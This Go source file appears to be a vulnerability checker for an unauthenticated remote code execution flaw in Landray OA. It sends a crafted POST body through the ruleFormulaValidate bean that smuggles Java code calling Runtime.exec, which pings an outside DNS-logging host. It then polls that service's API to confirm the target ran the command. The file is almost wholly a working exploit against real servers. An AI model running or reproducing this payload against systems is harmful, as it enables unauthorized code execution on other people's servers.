package main

import (
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"strings"
	"time"
)

var rand_str string

func LandrayOA() {
	fmt.Println("\n-----------------------✂---------------------------")
	fmt.Println("蓝凌OA未授权RCE 公开日期：2022/7/12")
	fmt.Println("\n-----------------------✂---------------------------")
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}
	client := &http.Client{Transport: tr}
	//client := &http.Client{Timeout: time.Second * 10}
	rand.Seed(time.Now().UnixNano())
	b := make([]byte, 2)
	rand.Read(b)
	rand_str = hex.EncodeToString(b)
	req, err := http.NewRequest("POST", url+OApath, strings.NewReader(
		`s_bean=ruleFormulaValidate&script=try {String cmd = "ping `+rand_str+`.uwpn82sm.eyes.sh";Process child = Runtime.getRuntime().exec(cmd);}catch (IOException e) {System.err.println(e);} `))
	if err != nil {
		fmt.Println("不存在蓝凌OA未授权RCE漏洞")
		return
	}
	req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0")
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Add("Connection", "close")
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("不存在蓝凌OA未授权RCE漏洞")
		return
	}
	defer resp.Body.Close()
	fmt.Println("延迟15秒接收DNSLOG......")
	time.Sleep(time.Duration(15) * time.Second)
	responseGet, err := http.Get("http://eyes.sh/api/dns/uwpn82sm/" + rand_str + "/?token=adb6ca99")
	if err != nil {
		fmt.Println("不存在蓝凌OA未授权RCE漏洞")
		return
	}
	defer responseGet.Body.Close()
	s, _ := ioutil.ReadAll(responseGet.Body)
	fmt.Printf("%s", s)
	if string(s) == "True" {
		fmt.Println("存在蓝凌OA未授权RCE漏洞")
	} else {
		fmt.Println("不存在蓝凌OA未授权RCE漏洞")
	}
}


